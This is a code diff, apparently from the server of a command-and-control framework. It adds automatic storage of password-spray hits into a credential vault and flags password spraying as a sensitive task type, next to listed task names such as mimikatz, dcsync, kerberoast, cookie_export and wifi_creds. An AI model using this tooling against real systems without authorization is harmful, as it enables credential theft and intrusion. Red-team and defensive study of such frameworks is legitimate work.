@@ -1345,6 +1345,20 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			})
 		}
 
+		// Auto-ingest valid password spray hits into the credential vault
+		if r.Type == "password_spray" && task.Status == "completed" && task.Result != "" {
+			if stored := s.parseAndStorePasswordSprayResults(uuid, *task, task.Result); stored > 0 {
+				s.eventManager.Emit(Event{
+					Type:      EventCredentialFound,
+					AgentID:   uuid,
+					AgentHost: agent.Hostname,
+					AgentIP:   agent.IP,
+					Timestamp: now,
+					Data:      map[string]interface{}{"source": "password_spray", "count": stored},
+				})
+			}
+		}
+
 		// Result size cap is enforced before parsing (see above); screenshots
 		// are exempt from the cap.
 		// Encrypt Result/Error at rest (H3): build a DB copy so the in-memory
@@ -1820,6 +1834,7 @@ var sensitiveTaskTypes = map[string]bool{
 	"inject": true, "shinject": true, "spawn": true, "shspawn": true,
 	"peloader": true, "bof": true,
 	"mimikatz": true, "creds": true, "kerberoast": true, "dcsync": true, "lsa_bypass": true,
+	"password_spray": true,
 	"download_url": true, "upload": true,
 	"cookie_export": true, "vpn_creds": true, "wifi_creds": true,
 }
